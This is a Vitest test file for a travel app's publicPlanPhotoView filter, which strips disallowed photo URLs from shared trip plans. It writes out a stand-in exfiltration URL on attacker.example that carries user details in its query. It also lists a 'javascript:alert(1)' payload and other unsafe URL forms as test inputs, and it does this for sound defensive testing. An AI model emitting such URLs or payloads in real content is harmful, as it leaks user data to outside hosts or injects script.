import { describe, it, expect } from 'vitest'
import { publicPlanPhotoView, isPublicPlanPhoto } from './publicPlanPhotos'
import { sanitizePlan } from './publicSanitizer'
import type { SharedResultPayload } from './sharedResult'
import type { TappyPlan } from '@/components/TripPlanCard'

// Gate 2 F-A-pub (P2, policy R1) — plan stop photos on the public read path. Old snapshots are fixed literals shaped like the rows
// already in `shared_results`; new snapshots are produced by the UNCHANGED `sanitizePlan` from a stored reply that still carries a
// model-written URL (a reply from before A1). R1 narrows where a browser connects; it is not a proof of provenance.

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh_budget200k'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const base = (plan?: unknown): SharedResultPayload => ({
  v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [], images: [], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
  ...(plan ? { plan: plan as TappyPlan } : {}),
} as SharedResultPayload)
const OLD = base({
  type: 'trip', title: 'Đà Lạt 2 ngày', people: 2, budget_total: '3 triệu',
  days: [
    { label: 'Ngày 1', items: [
      { time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', description: 'Phở', price: '', address: '1 Trần Phú', photo_url: EXFIL },
      { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ Xuân Hương', description: '', price: '', photo_url: TBN },
    ] },
    { label: 'Ngày 2', items: [{ time: '09:00', emoji: '🚗', category: 'transport', name: 'Về', description: '', price: '' }] },
  ],
})
const photos = (p: SharedResultPayload) => (p.plan?.days ?? []).flatMap(d => d.items.map(i => (i as { photo_url?: string }).photo_url ?? null))

describe('F-A-pub · publicPlanPhotoView (policy R1)', () => {
  it('TP1 · old snapshot: the https URL on an unlisted host loses its photo_url key only', () => {
    const out = publicPlanPhotoView(OLD)
    expect(JSON.stringify(out)).not.toContain('attacker.example')
    expect(photos(out)).toEqual([null, TBN, null])
    const first = out.plan!.days[0].items[0] as unknown as Record<string, unknown>
    expect(first).not.toHaveProperty('photo_url')
    expect(first).toEqual({ time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', description: 'Phở', price: '', address: '1 Trần Phú' })
  })
  it('TP2 · new snapshot from an old reply (the unchanged sanitizePlan keeps the URL; the read path removes it)', () => {
    const fromSanitizer = sanitizePlan({ type: 'trip', title: 'Đà Lạt', days: [{ label: 'Ngày 1', items: [{ time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', photo_url: EXFIL }] }] } as unknown as TappyPlan)
    expect(JSON.stringify(fromSanitizer), 'precondition: the snapshot writer keeps it today').toContain('attacker.example')
    const out = publicPlanPhotoView(base(fromSanitizer))
    expect(JSON.stringify(out)).not.toContain('attacker.example')
  })
  it('TP3 · a photo allowed by R1 is kept byte for byte', () => {
    expect(photos(publicPlanPhotoView(OLD))[1]).toBe(TBN)
    expect(isPublicPlanPhoto(TBN)).toBe(true)
  })
  it('TP4 · Places photos, unsafe schemes and unsafe forms are removed', () => {
    for (const bad of [
      'https://lh5.googleusercontent.com/p/AF1QipPlaces=w400', // Google Places photo: not storable (Places terms)
      'https://lh5.ggpht.com/abc=w400',                        // ggpht: not storable
      'data:image/svg+xml;base64,PHN2Zy8+', 'http://encrypted-tbn0.gstatic.com/images?q=x', 'https://u:p@encrypted-tbn0.gstatic.com/x',
      'https://10.0.0.5/a.jpg', 'javascript:alert(1)',
    ]) {
      const out = publicPlanPhotoView(base({ type: 'trip', title: 't', days: [{ label: 'd', items: [{ name: 'A', photo_url: bad }] }] }))
      expect(photos(out), bad).toEqual([null])
    }
  })
  it('TP7 · structure: same days, items, order and fields; nothing to remove = the very same object', () => {
    const out = publicPlanPhotoView(OLD)
    expect(out.plan!.days.map(d => d.items.length)).toEqual([2, 1])
    expect(out.plan!.days.map(d => d.label)).toEqual(['Ngày 1', 'Ngày 2'])
    expect({ ...out, plan: undefined }).toEqual({ ...OLD, plan: undefined })
    expect(out.plan!.days[1]).toBe(OLD.plan!.days[1]) // an untouched day is not even copied
    expect(OLD.plan!.days[0].items[0]).toHaveProperty('photo_url', EXFIL) // input not mutated
    const clean = base({ type: 'trip', title: 't', days: [{ label: 'd', items: [{ name: 'A', photo_url: TBN }, { name: 'B' }] }] })
    expect(publicPlanPhotoView(clean)).toBe(clean)
    const noPlan = base()
    expect(publicPlanPhotoView(noPlan)).toBe(noPlan)
    const odd = base({ type: 'trip', title: 't', days: [null, { label: 'd', items: [null, { name: 'A', photo_url: EXFIL }] }] })
    const oddOut = publicPlanPhotoView(odd)
    expect(oddOut.plan!.days[0]).toBeNull()
    expect(oddOut.plan!.days[1].items).toEqual([null, { name: 'A' }])
  })
})
